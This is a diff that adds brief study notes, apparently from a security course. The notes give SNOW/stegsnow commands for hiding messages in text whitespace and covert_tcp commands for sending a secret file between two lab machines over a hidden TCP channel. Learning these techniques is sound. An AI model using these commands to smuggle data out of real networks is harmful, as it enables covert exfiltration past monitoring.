@@ -1,0 +1,18 @@
+
+SNOW.EXE -C -m "You can pass" -p "pa$$word" Secret.txt Hiddensecret.txt    [for hiding]
+SNOW.EXE -C  -p "pa$$word"  Hiddensecret.txt    [for revealing]
+
+sametool in linux:
+apt install stegsnow
+stegsnow -C -m "secret file" -p "password" secret.txt hiddensecret.txt    [for hiding a message]
+stegsnow -C -p "password"  hiddensecret.txt    [for revealing]
+
+
+
+cc -o covert_tcp covert_tcp.c    [on source os]
+cc -o covert_tcp covert_tcp.c    [on dest os]
+
+./covert_tcp -source 192.168.149.129 -source_port 8888 -server -file receive.txt    [listening for the file]
+***listen before sending
+./covert_tcp -source 192.168.149.129 -dest 192.168.149.130 -source_port 9999 -dest_port 8888 -file secret.txt    [for sending file]
+
